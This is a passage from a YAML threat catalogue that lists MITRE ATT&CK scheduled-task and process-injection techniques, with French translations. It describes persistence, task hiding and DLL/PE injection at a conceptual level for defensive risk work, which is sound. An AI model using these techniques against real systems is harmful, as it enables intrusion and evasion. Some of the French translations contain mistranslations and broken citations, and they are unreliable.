          e (ex : RPC et partage de fichiers et d\u2019imprimante dans les environnements\
          \ Windows). Planifier une t\xE2che sur un syst\xE8me distant peut g\xE9\
          n\xE9ralement n\xE9cessiter d\u2019\xEAtre membre d\u2019un groupe administrateur\
          \ ou d\u2019un groupe privil\xE9gi\xE9 sur le syst\xE8me distant. (Citation\
          \ : S\xE9curit\xE9 du planificateur de t\xE2ches TechNet)\n\nLes adversaires\
          \ peuvent utiliser la planification des t\xE2ches pour ex\xE9cuter des programmes\
          \ au d\xE9marrage du syst\xE8me ou sur une base planifi\xE9e pour la persistance.\
          \ Ces m\xE9canismes peuvent \xE9galement \xEAtre abus\xE9s pour ex\xE9cuter\
          \ un processus dans le contexte d\u2019un compte sp\xE9cifi\xE9 (comme un\
          \ avec des permissions/privil\xE8ges \xE9lev\xE9s). \xC0 l\u2019instar de\
          \ [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),\
          \ les adversaires ont \xE9galement abus\xE9 de la planification des t\xE2\
          ches pour potentiellement masquer une ex\xE9cution unique sous un processus\
          \ syst\xE8me de confiance. (Citation : ProofPoint Serpent)\nhttps://attack.mitre.org/techniques/T1053"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.002
    ref_id: T1053.002
    name: At
    description: 'Adversaries may abuse the [at](https://attack.mitre.org/software/S0110)
      utility to perform task scheduling for initial or recurring execution of malicious
      code. The [at](https://attack.mitre.org/software/S0110) utility exists as an
      executable within Windows, Linux, and macOS for scheduling tasks at a specified
      time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)''s
      [schtasks](https://attack.mitre.org/software/S0111) in Windows environments,
      using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler
      service be running, and the user to be logged on as a member of the local Administrators
      group. In addition to explicitly running the `at` command, adversaries may also
      schedule a task with [at](https://attack.mitre.org/software/S0110) by directly
      leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)


      On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked
      by the superuser as well as any users added to the <code>at.allow</code> file.
      If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file
      is checked. Every username not listed in <code>at.deny</code> is allowed to
      invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code>
      exists and is empty, global use of [at](https://attack.mitre.org/software/S0110)
      is permitted. If neither file exists (which is often the baseline) only the
      superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation:
      Linux at)


      Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).
      [at](https://attack.mitre.org/software/S0110) can also be abused to conduct
      remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral
      Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under
      the context of a specified account (such as SYSTEM).


      In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110)
      to break out of restricted environments by using a task to spawn an interactive
      system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110)
      may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004)
      if the binary is allowed to run as superuser via <code>sudo</code>.(Citation:
      GTFObins at)

      https://attack.mitre.org/techniques/T1053/002'
    translations:
      fr:
        name: "\xC0"
        description: "Les adversaires peuvent abuser de l\u2019utilitaire [at](https://attack.mitre.org/software/S0110)\
          \ pour effectuer la planification des t\xE2ches lors de l\u2019ex\xE9cution\
          \ initiale ou r\xE9currente de code malveillant. L\u2019utilitaire [at](https://attack.mitre.org/software/S0110)\
          \ existe en tant qu\u2019ex\xE9cutable dans Windows, Linux et macOS pour\
          \ planifier les t\xE2ches \xE0 une date et une heure sp\xE9cifi\xE9es. Bien\
          \ que cela ait \xE9t\xE9 obsol\xE8te au profit des [schtasks](https://attack.mitre.org/techniques/T1053/005\
          \ https://attack.mitre.org/software/S0111) de [Scheduled Task]() dans les\
          \ environnements Windows, utiliser [at](https://attack.mitre.org/software/S0110)\
          \ n\xE9cessite que le service Scheduler des t\xE2ches soit en cours d\u2019\
          ex\xE9cution et que l\u2019utilisateur soit connect\xE9 en tant que membre\
          \ du groupe local des Administrateurs. En plus d\u2019ex\xE9cuter explicitement\
          \ la commande 'at', les adversaires peuvent \xE9galement planifier une t\xE2\
          che avec [at](https://attack.mitre.org/software/S0110) en utilisant directement\
          \ la classe WMI 'Win32_ScheduledJob' [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\
          \ (Citation : Malicious Life by Cybereason)\n\nSous Linux et macOS, [at](https://attack.mitre.org/software/S0110)\
          \ peut \xEAtre invoqu\xE9 par le superutilisateur ainsi que par tout utilisateur\
          \ ajout\xE9 au fichier <code>at.permit</code>. Si le fichier <code>at.allow</code>\
          \ n\u2019existe pas, le fichier <code>at.deny</code> est coch\xE9. Tout\
          \ nom d\u2019utilisateur non list\xE9 dans <code>at.deny</code> est autoris\xE9\
          \ \xE0 invoquer [at](https://attack.mitre.org/software/S0110). Si le <code>at.deny</code>\
          \ existe et est vide, l\u2019utilisation globale de [at](https://attack.mitre.org/software/S0110)\
          \ est autoris\xE9e. Si aucun des deux fichiers n\u2019existe (ce qui est\
          \ souvent la base), seul le superutilisateur est autoris\xE9 \xE0 utiliser\
          \ [at](https://attack.mitre.org/software/S0110). (Citation : Linux \xE0\
          )\n\nLes adversaires peuvent utiliser [at](https://attack.mitre.org/software/S0110)\
          \ pour ex\xE9cuter des programmes au d\xE9marrage du syst\xE8me ou sur une\
          \ base planifi\xE9e pour [Persistance](https://attack.mitre.org/tactics/TA0003).\
          \ [\xE0](https://attack.mitre.org/software/S0110) peut \xE9galement \xEA\
          tre abus\xE9 pour effectuer une [Ex\xE9cution](https://attack.mitre.org/tactics/TA0002)\
          \ \xE0 distance dans le cadre de [Mouvement lat\xE9ral](https://attack.mitre.org/tactics/TA0008)\
          \ et/ou pour ex\xE9cuter un processus dans le cadre d\u2019un compte sp\xE9\
          cifi\xE9 (tel que SYSTEM).\n\nDans les environnements Linux, les adversaires\
          \ peuvent \xE9galement abuser de [at](https://attack.mitre.org/software/S0110)\
          \ pour sortir d\u2019environnements restreints en utilisant une t\xE2che\
          \ pour g\xE9n\xE9rer un shell syst\xE8me interactif ou ex\xE9cuter des commandes\
          \ syst\xE8me. De m\xEAme, [at](https://attack.mitre.org/software/S0110)\
          \ peut aussi \xEAtre utilis\xE9 pour [Escalade de privil\xE8ges](https://attack.mitre.org/tactics/TA0004)\
          \ si le binaire est autoris\xE9 \xE0 s\u2019ex\xE9cuter en superutilisateur\
          \ via <code>sudo</code>. (Citation : allez partir \xE0 la section \xE0)\n\
          https://attack.mitre.org/techniques/T1053/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.003
    ref_id: T1053.003
    name: Cron
    description: 'Adversaries may abuse the <code>cron</code> utility to perform task
      scheduling for initial or recurring execution of malicious code.(Citation: 20
      macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based
      job scheduler for Unix-like operating systems.  The <code> crontab</code> file
      contains the schedule of cron entries to be run and the specified times for
      execution. Any <code>crontab</code> files are stored in operating system-specific
      file paths.


      An adversary may use <code>cron</code> in Linux or Unix environments to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).
      In ESXi environments, cron jobs must be created directly via the crontab file
      (e.g., `/var/spool/cron/crontabs/root`).(Citation: CloudSEK ESXiArgs 2023)

      https://attack.mitre.org/techniques/T1053/003'
    translations:
      fr:
        name: Cron
        description: "Les adversaires peuvent abuser de l\u2019utilitaire <code>cron</code>\
          \ pour effectuer la planification des t\xE2ches en vue de l\u2019ex\xE9\
          cution initiale ou r\xE9currente de code malveillant. (Citation : 20 outils\
          \ et techniques courants sur macOS) L\u2019utilitaire <code>cron</code>\
          \ est un planificateur de t\xE2ches bas\xE9 sur le temps pour les syst\xE8\
          mes d\u2019exploitation de type Unix.  Le fichier <code> crontab</code>\
          \ contient le calendrier des entr\xE9es cron \xE0 ex\xE9cuter ainsi que\
          \ les d\xE9lais sp\xE9cifi\xE9s pour l\u2019ex\xE9cution. Tous les fichiers\
          \ <code>crontab</code> sont stock\xE9s dans des chemins sp\xE9cifiques au\
          \ syst\xE8me d\u2019exploitation.\n\nUn adversaire peut utiliser <code>cron</code>\
          \ dans des environnements Linux ou Unix pour ex\xE9cuter des programmes\
          \ au d\xE9marrage du syst\xE8me ou sur une base planifi\xE9e pour [Persistance](https://attack.mitre.org/tactics/TA0003).\
          \ Dans les environnements ESXi, les t\xE2ches cron doivent \xEAtre cr\xE9\
          \xE9es directement via le fichier crontab (par exemple, \xAB /var/spool/cron/crontabs/root\
          \ \xBB). (Citation : CloudSEK ESXiArgs 2023)\nhttps://attack.mitre.org/techniques/T1053/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.005
    ref_id: T1053.005
    name: Scheduled Task
    description: 'Adversaries may abuse the Windows Task Scheduler to perform task
      scheduling for initial or recurring execution of malicious code. There are multiple
      ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
      utility can be run directly on the command line, or the Task Scheduler can be
      opened through the GUI within the Administrator Tools section of the Control
      Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
      wrapper for the Windows Task Scheduler, and alternatively, adversaries have
      used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)
      (WMI) to create a scheduled task. Adversaries may also utilize the Powershell
      Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create
      a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)


      An adversary may use Windows Task Scheduler to execute programs at system startup
      or on a scheduled basis for persistence. The Windows Task Scheduler can also
      be abused to conduct remote Execution as part of Lateral Movement and/or to
      run a process under the context of a specified account (such as SYSTEM). Similar
      to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),
      adversaries have also abused the Windows Task Scheduler to potentially mask
      one-time execution under signed/trusted system processes.(Citation: ProofPoint
      Serpent)


      Adversaries may also create "hidden" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564))
      that may not be visible to defender tools and manual queries used to enumerate
      tasks. Specifically, an adversary may hide a task from `schtasks /query` and
      the Task Scheduler by deleting the associated Security Descriptor (SD) registry
      value (where deletion of this value must be completed using SYSTEM permissions).(Citation:
      SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate
      methods to hide tasks, such as altering the metadata (e.g., `Index` value) within
      associated registry keys.(Citation: Defending Against Scheduled Task Attacks
      in Windows Environments)

      https://attack.mitre.org/techniques/T1053/005'
    translations:
      fr:
        name: "T\xE2che programm\xE9e"
        description: "Les adversaires peuvent abuser du planificateur des t\xE2ches\
          \ Windows pour effectuer la planification des t\xE2ches en vue d\u2019une\
          \ ex\xE9cution initiale ou r\xE9currente de code malveillant. Il existe\
          \ plusieurs fa\xE7ons d\u2019acc\xE9der au planificateur des t\xE2ches sous\
          \ Windows. L\u2019utilitaire [schtasks](https://attack.mitre.org/software/S0111)\
          \ peut \xEAtre ex\xE9cut\xE9 directement en ligne de commande, ou l\u2019\
          ordonnanceur des t\xE2ches peut \xEAtre ouvert via l\u2019interface graphique\
          \ dans la section Outils d\u2019administrateur du Panneau de configuration.\
          \ (Citation : D\xE9bordement de pile) Dans certains cas, des adversaires\
          \ ont utilis\xE9 un envelopper .NET pour le planificateur des t\xE2ches\
          \ Windows, et alternativement, les adversaires ont utilis\xE9 la biblioth\xE8\
          que Windows netapi32 et [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\
          \ (WMI) pour cr\xE9er une t\xE2che planifi\xE9e. Les adversaires peuvent\
          \ \xE9galement utiliser le commandlet Powershell 'Invoke-CimMethod', qui\
          \ exploite la classe WMI 'PS_ScheduledTask' pour cr\xE9er une t\xE2che planifi\xE9\
          e via un chemin XML. (Citation : Red Canary - \xC9quipe Atomic Red)\n\n\
          Un adversaire peut utiliser le planificateur de t\xE2ches de Windows pour\
          \ ex\xE9cuter des programmes au d\xE9marrage du syst\xE8me ou sur une base\
          \ planifi\xE9e pour la persistance. Le planificateur de t\xE2ches Windows\
          \ peut \xE9galement \xEAtre abus\xE9 pour effectuer une ex\xE9cution \xE0\
          \ distance dans le cadre d\u2019un mouvement lat\xE9ral et/ou pour ex\xE9\
          cuter un processus dans le cadre d\u2019un compte sp\xE9cifi\xE9 (comme\
          \ SYSTEM). \xC0 l\u2019instar de [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218),\
          \ les adversaires ont \xE9galement abus\xE9 du planificateur des t\xE2ches\
          \ Windows pour potentiellement masquer une ex\xE9cution unique sous des\
          \ processus syst\xE8me sign\xE9s/fiables. (Citation : ProofPoint Serpent)\n\
          \nLes adversaires peuvent \xE9galement cr\xE9er des t\xE2ches planifi\xE9\
          es \xAB cach\xE9es \xBB (c\u2019est-\xE0-dire [Masquer les artefacts](https://attack.mitre.org/techniques/T1564))\
          \ qui peuvent ne pas \xEAtre visibles par les outils de d\xE9fense et les\
          \ requ\xEAtes manuelles utilis\xE9es pour \xE9num\xE9rer les t\xE2ches.\
          \ Plus pr\xE9cis\xE9ment, un adversaire peut masquer une t\xE2che \xE0 \xAB\
          \ schtasks /query \xBB et au planificateur de t\xE2ches en supprimant la\
          \ valeur associ\xE9e du registre du descripteur de s\xE9curit\xE9 (SD) (o\xF9\
          \ la suppression de cette valeur doit \xEAtre effectu\xE9e en utilisant\
          \ les permissions SYSTEM). (Citation : SigmaHQ)(Citation : T\xE2che pr\xE9\
          vue par Tarrask) Les adversaires peuvent \xE9galement employer d\u2019autres\
          \ m\xE9thodes pour masquer les t\xE2ches, comme modifier les m\xE9tadonn\xE9\
          es (par exemple, la valeur \xAB Index \xBB) dans les cl\xE9s du registre\
          \ associ\xE9es. (Citation : D\xE9fense contre les attaques de t\xE2ches\
          \ planifi\xE9es dans les environnements Windows)\nhttps://attack.mitre.org/techniques/T1053/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.006
    ref_id: T1053.006
    name: Systemd Timers
    description: 'Adversaries may abuse systemd timers to perform task scheduling
      for initial or recurring execution of malicious code. Systemd timers are unit
      files with file extension <code>.timer</code> that control services. Timers
      can be set to run on a calendar event or after a time span relative to a starting
      point. They can be used as an alternative to [Cron](https://attack.mitre.org/techniques/T1053/003)
      in Linux environments.(Citation: archlinux Systemd Timers Aug 2020) Systemd
      timers may be activated remotely via the <code>systemctl</code> command line
      utility, which operates over [SSH](https://attack.mitre.org/techniques/T1021/004).(Citation:
      Systemd Remote Control)


      Each <code>.timer</code> file must have a corresponding <code>.service</code>
      file with the same name, e.g., <code>example.timer</code> and <code>example.service</code>.
      <code>.service</code> files are [Systemd Service](https://attack.mitre.org/techniques/T1543/002)
      unit files that are managed by the systemd system and service manager.(Citation:
      Linux man-pages: systemd January 2014) Privileged timers are written to <code>/etc/systemd/system/</code>
      and <code>/usr/lib/systemd/system</code> while user level are written to <code>~/.config/systemd/user/</code>.


      An adversary may use systemd timers to execute malicious code at system startup
      or on a scheduled basis for persistence.(Citation: Arch Linux Package Systemd
      Compromise BleepingComputer 10JUL2018)(Citation: gist Arch package compromise
      10JUL2018)(Citation: acroread package compromised Arch Linux Mail 8JUL2018)
      Timers installed using privileged paths may be used to maintain root level persistence.
      Adversaries may also install user level timers to achieve user level persistence.(Citation:
      Falcon Sandbox smp: 28553b3a9d)

      https://attack.mitre.org/techniques/T1053/006'
    translations:
      fr:
        name: Minuteurs Systemd
        description: "Les adversaires peuvent abuser des minuteurs systemd pour effectuer\
          \ la planification des t\xE2ches lors de l\u2019ex\xE9cution initiale ou\
          \ r\xE9currente de code malveillant. Les minuteurs systemd sont des fichiers\
          \ d\u2019unit\xE9 avec l\u2019extension <code>.timer</code> qui contr\xF4\
          lent les services. Les minuteurs peuvent \xEAtre programm\xE9s pour s\u2019\
          ex\xE9cuter sur un \xE9v\xE9nement du calendrier ou apr\xE8s une p\xE9riode\
          \ relative \xE0 un point de d\xE9part. Ils peuvent \xEAtre utilis\xE9s comme\
          \ alternative \xE0 [Cron](https://attack.mitre.org/techniques/T1053/003)\
          \ dans les environnements Linux. (Citation : archlinux Systemd Timers ao\xFB\
          t 2020) Les minuteurs systemd peuvent \xEAtre activ\xE9s \xE0 distance via\
          \ l\u2019utilitaire de ligne <code>de commande systemctl</code>, qui fonctionne\
          \ via [SSH](https://attack.mitre.org/techniques/T1021/004). (Citation :\
          \ T\xE9l\xE9commande syst\xE9matique)\n\nChaque fichier <code>.timer</code>\
          \ doit avoir un fichier <code>.service</code> correspondant portant le m\xEA\
          me nom, par exemple<code>, example.timer</code> et <code>example.service</code>.\
          \ <code>.service</code> sont des fichiers unitaires [Systemd Service](https://attack.mitre.org/techniques/T1543/002)\
          \ g\xE9r\xE9s par le syst\xE8me et le gestionnaire de service Systemd. (Citation\
          \ : Linux man-pages : systemd janvier 2014) Les minuteurs privil\xE9gi\xE9\
          s sont \xE9crits sur <code>/etc/systemd/system/</code> et <code>/usr/lib/systemd/system</code>\
          \ tandis que le niveau utilisateur est \xE9crit sur <code>~/.config/systemd/user/</code>.\n\
          \nUn adversaire peut utiliser des minuteurs systemd pour ex\xE9cuter du\
          \ code malveillant au d\xE9marrage du syst\xE8me ou sur une base planifi\xE9\
          e pour la persistance. (Citation : Arch Linux Package Systemd Compromise\
          \ BleepingComputer 10JUIL2018)(Citation : compromis du paquet Arch 10JUIL2018)(Citation\
          \ : paquet acroread compromis Arch Linux Mail 8JUIL2018) Les minuteurs install\xE9\
          s via des chemins privil\xE9gi\xE9s peuvent \xEAtre utilis\xE9s pour maintenir\
          \ la persistance au niveau root. Les adversaires peuvent \xE9galement installer\
          \ des minuteurs au niveau utilisateur pour assurer la persistance au niveau\
          \ utilisateur. (Citation : Falcon Sandbox smp : 28553b3a9d)\nhttps://attack.mitre.org/techniques/T1053/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.007
    ref_id: T1053.007
    name: Container Orchestration Job
    description: 'Adversaries may abuse task scheduling functionality provided by
      container orchestration tools such as Kubernetes to schedule deployment of containers
      configured to execute malicious code. Container orchestration jobs run these
      automated tasks at a specific date and time, similar to cron jobs on a Linux
      system. Deployments of this type can also be configured to maintain a quantity
      of containers over time, automating the process of maintaining persistence within
      a cluster.


      In Kubernetes, a CronJob may be used to schedule a Job that runs one or more
      containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes
      CronJob) An adversary therefore may utilize a CronJob to schedule deployment
      of a Job that executes malicious code in various nodes within a cluster.(Citation:
      Threat Matrix for Kubernetes)

      https://attack.mitre.org/techniques/T1053/007'
    translations:
      fr:
        name: "Travail d\u2019orchestration de conteneurs"
        description: "Les adversaires peuvent abuser des fonctionnalit\xE9s de planification\
          \ des t\xE2ches fournies par des outils d\u2019orchestration de conteneurs\
          \ tels que Kubernetes pour planifier le d\xE9ploiement de conteneurs configur\xE9\
          s pour ex\xE9cuter du code malveillant. Les t\xE2ches d\u2019orchestration\
          \ de conteneurs ex\xE9cutent ces t\xE2ches automatis\xE9es \xE0 une date\
          \ et une heure pr\xE9cises, de mani\xE8re similaire aux t\xE2ches cron sur\
          \ un syst\xE8me Linux. Les d\xE9ploiements de ce type peuvent \xE9galement\
          \ \xEAtre configur\xE9s pour maintenir un certain nombre de conteneurs dans\
          \ le temps, automatisant ainsi le processus de maintien de la persistance\
          \ au sein d\u2019un cluster.\n\nDans Kubernetes, un CronJob peut \xEAtre\
          \ utilis\xE9 pour planifier un Job qui ex\xE9cute un ou plusieurs conteneurs\
          \ pour effectuer des t\xE2ches sp\xE9cifiques. (Citation : Kubernetes Jobs)(Citation\
          \ : Kubernetes CronJob) Un adversaire peut donc utiliser un CronJob pour\
          \ planifier le d\xE9ploiement d\u2019un Job ex\xE9cutant du code malveillant\
          \ dans divers n\u0153uds d\u2019un cluster. (Citation : Matrice de menaces\
          \ pour Kubernetes)\nhttps://attack.mitre.org/techniques/T1053/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055
    ref_id: T1055
    name: Process Injection
    description: "Adversaries may inject code into processes in order to evade process-based\
      \ defenses as well as possibly elevate privileges. Process injection is a method\
      \ of executing arbitrary code in the address space of a separate live process.\
      \ Running code in the context of another process may allow access to the process's\
      \ memory, system/network resources, and possibly elevated privileges. Execution\
      \ via process injection may also evade detection from security products since\
      \ the execution is masked under a legitimate process. \n\nThere are many different\
      \ ways to inject code into a process, many of which abuse legitimate functionalities.\
      \ These implementations exist for every major OS but are typically platform\
      \ specific. \n\nMore sophisticated samples may perform multiple process injections\
      \ to segment modules and further evade detection, utilizing named pipes or other\
      \ inter-process communication (IPC) mechanisms as a communication channel.\n\
      https://attack.mitre.org/techniques/T1055"
    translations:
      fr:
        name: "Injection de proc\xE9d\xE9"
        description: "Les adversaires peuvent injecter du code dans les processus\
          \ afin d\u2019\xE9chapper aux d\xE9fenses bas\xE9es sur les processus et\
          \ \xE9ventuellement d\u2019augmenter leurs privil\xE8ges. L\u2019injection\
          \ de processus est une m\xE9thode d\u2019ex\xE9cution de code arbitraire\
          \ dans l\u2019espace d\u2019adressage d\u2019un processus en ligne distinct.\
          \ L\u2019ex\xE9cution du code dans le contexte d\u2019un autre processus\
          \ peut permettre d\u2019acc\xE9der \xE0 la m\xE9moire du processus, aux\
          \ ressources syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0 des privil\xE8\
          ges \xE9lev\xE9s. L\u2019ex\xE9cution via injection de processus peut \xE9\
          galement \xE9chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9\
          \ puisque l\u2019ex\xE9cution est masqu\xE9e sous un processus l\xE9gitime.\
          \ \n\nIl existe de nombreuses fa\xE7ons diff\xE9rentes d\u2019injecter du\
          \ code dans un processus, dont beaucoup abusent de fonctionnalit\xE9s l\xE9\
          gitimes. Ces impl\xE9mentations existent pour tous les syst\xE8mes d\u2019\
          exploitation majeurs mais sont g\xE9n\xE9ralement sp\xE9cifiques \xE0 chaque\
          \ plateforme. \n\nDes \xE9chantillons plus sophistiqu\xE9s peuvent effectuer\
          \ plusieurs injections de proc\xE9d\xE9s dans des modules segment\xE9s et\
          \ \xE9chapper davantage \xE0 la d\xE9tection, en utilisant des tuyaux nomm\xE9\
          s ou d\u2019autres m\xE9canismes de communication inter-processus (IPC)\
          \ comme canal de communication.\nhttps://attack.mitre.org/techniques/T1055"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.001
    ref_id: T1055.001
    name: Dynamic-link Library Injection
    description: "Adversaries may inject dynamic-link libraries (DLLs) into processes\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ DLL injection is a method of executing arbitrary code in the address space\
      \ of a separate live process.  \n\nDLL injection is commonly performed by writing\
      \ the path to a DLL in the virtual address space of the target process before\
      \ loading the DLL by invoking a new thread. The write can be performed with\
      \ native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code>\
      \ API responsible for loading the DLL). (Citation: Elastic Process Injection\
      \ July 2017) \n\nVariations of this method such as reflective DLL injection\
      \ (writing a self-mapping DLL into a process) and memory module (map DLL when\
      \ writing into process) overcome the address relocation issue as well as the\
      \ additional APIs to invoke execution (since these methods load and execute\
      \ the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation:\
      \ Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July\
      \ 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading\
      \ or DLL Hollowing, may be leveraged to conceal injected code within a process.\
      \ This method involves loading a legitimate DLL into a remote process then manually\
      \ overwriting the module's <code>AddressOfEntryPoint</code> before starting\
      \ a new thread in the target process.(Citation: Module Stomping for Shellcode\
      \ Injection) This variation allows attackers to hide malicious injected code\
      \ by potentially backing its execution with a legitimate DLL file on disk.(Citation:\
      \ Hiding Malicious Code with Module Stomping) \n\nRunning code in the context\
      \ of another process may allow access to the process's memory, system/network\
      \ resources, and possibly elevated privileges. Execution via DLL injection may\
      \ also evade detection from security products since the execution is masked\
      \ under a legitimate process.\nhttps://attack.mitre.org/techniques/T1055/001"
    translations:
      fr:
        name: "Injection de biblioth\xE8que \xE0 liens dynamiques"
        description: "Les adversaires peuvent injecter des biblioth\xE8ques \xE0 liaison\
          \ dynamique (DLL) dans les processus afin d\u2019\xE9chapper aux d\xE9fenses\
          \ bas\xE9es sur les processus et \xE9ventuellement d\u2019augmenter leurs\
          \ privil\xE8ges. L\u2019injection de DLL est une m\xE9thode d\u2019ex\xE9\
          cution de code arbitraire dans l\u2019espace d\u2019adressage d\u2019un\
          \ processus en direct s\xE9par\xE9.  \n\nL\u2019injection de DLL est g\xE9\
          n\xE9ralement effectu\xE9e en \xE9crivant le chemin vers une DLL dans l\u2019\
          espace d\u2019adressage virtuel du processus cible avant de charger la DLL\
          \ en invoquant un nouveau thread. L\u2019\xE9criture peut \xEAtre effectu\xE9\
          e avec des appels natifs d\u2019API Windows tels que <code>VirtualAllocEx</code>\
          \ et <code>WriteProcessMemory</code>, puis invoqu\xE9e avec <code>CreateRemoteThread</code>\
          \ (qui appelle l\u2019API <code>LoadLibrary</code> responsable du chargement\
          \ des DLL). (Citation : Injection de proc\xE9d\xE9 \xE9lastique juillet\
          \ 2017) \n\nDes variantes de cette m\xE9thode, telles que l\u2019injection\
          \ de DLL r\xE9fl\xE9chissante (\xE9criture d\u2019une DLL auto-mapp\xE9\
          e dans un processus) et le module m\xE9moire (map DLL lors de l\u2019\xE9\
          criture dans le processus), permettent de r\xE9soudre le probl\xE8me de\
          \ relocalisation d\u2019adresses ainsi que les API suppl\xE9mentaires pour\
          \ invoquer l\u2019ex\xE9cution (puisque ces m\xE9thodes chargent et ex\xE9\
          cutent les fichiers en m\xE9moire en effectuant manuellement la fonction\
          \ de <code>LoadLibrary</code>). (Citation : Elastic HuntingNMemory juin\
          \ 2017)(Citation : Injection de proc\xE9d\xE9 \xE9lastique juillet 2017)\
          \ \n\nUne autre variante de cette m\xE9thode, souvent appel\xE9e Module\
          \ Stomping/Overload ou DLL Hollowing, peut \xEAtre utilis\xE9e pour dissimuler\
          \ du code inject\xE9 au sein d\u2019un processus. Cette m\xE9thode consiste\
          \ \xE0 charger une DLL l\xE9gitime dans un processus distant puis \xE0 \xE9\
          craser manuellement <code>l\u2019AddressOfEntryPoint</code> du module avant\
          \ de lancer un nouveau thread dans le processus cible. (Citation : Module\
          \ Shackping pour injection de shellcode) Cette variante permet aux attaquants\
          \ de dissimuler du code malveillant inject\xE9 en pouvant potentiellement\
          \ sauvegarder son ex\xE9cution avec un fichier DLL l\xE9gitime sur disque.\
          \ (Citation : Dissimulation de code malveillant avec le pi\xE9tinement des\
          \ modules) \n\nL\u2019ex\xE9cution du code dans le contexte d\u2019un autre\
          \ processus peut permettre d\u2019acc\xE9der \xE0 la m\xE9moire du processus,\
          \ aux ressources syst\xE8me/r\xE9seau, et \xE9ventuellement \xE0 des privil\xE8\
          ges \xE9lev\xE9s. L\u2019ex\xE9cution via injection de DLL peut \xE9galement\
          \ \xE9chapper \xE0 la d\xE9tection des produits de s\xE9curit\xE9 puisque\
          \ l\u2019ex\xE9cution est masqu\xE9e par un processus l\xE9gitime.\nhttps://attack.mitre.org/techniques/T1055/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1055.002
    ref_id: T1055.002
    name: Portable Executable Injection
    description: "Adversaries may inject portable executables (PE) into processes\
      \ in order to evade process-based defenses as well as possibly elevate privileges.\
      \ PE injection is a method of executing arbitrary code in the address space\
      \ of a separate live process. \n\nPE injection is commonly performed by copying\
      \ code (perhaps without a file on disk) into the virtual address space of the\
      \ target process before invoking it via a new thread. The write can be performed\
      \ with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>,\
      \ then invoked with <code>CreateRemoteThread</code> or additional code (ex:\
      \ shellcode). The displacement of the injected code does introduce the additional\
      \ requirement for functionality to remap memory references. (Citation: Elastic\
      \ Process Injection July 2017) \n\nRunning code in the context of another process\
      \ may allow access to the process's memory, system/network resources, and possibly\
      \ elevated privileges. Execution via PE injection may also evade detection from\
      \ security products since the execution is masked under a legitimate process.\n\
      https://attack.mitre.org/techniques/T1055/002"
    translations:
      fr:
        name: "Injection d\u2019ex\xE9cutables portables"
        description: "Les adversaires peuvent injecter des ex\xE9cutables portables\
          \ (PE) dans les processus afin d\u2019\xE9chapper aux d\xE9fenses bas\xE9\
          es sur les processus et \xE9ventuellement d\u2019augmenter leurs privil\xE8\
          ges. L\u2019injection PE est une m\xE9thode d\u2019ex\xE9cution de code\
          \ arbitraire dans l\u2019espace d\u2019adressage d\u2019un processus en\
          \ direct s\xE9par\xE9. \n\nL\u2019injection PE est g\xE9n\xE9ralement effectu\xE9\
          e en copiant du code (peut-\xEAtre sans fichier sur disque) dans l\u2019\
          espace d\u2019adressage virtuel du processus cible avant de l\u2019invoquer\
          \ via un nouveau thread. L\u2019\xE9criture peut \xEAtre effectu\xE9e avec\
          \ des appels natifs d\u2019API Windows tels que <code>VirtualAllocEx</code>\
          \ et <code>WriteProcessMemory</code>, puis invoqu\xE9e avec <code>CreateRemoteThread</code>\
          \ ou du code suppl\xE9mentaire (ex : shellcode). Le d\xE9placement du code\
          \ inject\xE9 introduit l\u2019exigence suppl\xE9mentaire de fonctionnalit\xE9\
          \ pour remapper les r\xE9f\xE9rences m\xE9moire. (Citation : Injection de\
          \ proc\xE9d\xE9 \xE9lastique juillet 2017) \n\nL\u2019ex\xE9cution du code\
          \ dans le contexte d\u2019un autre processus peut permettre d\u2019acc\xE9\
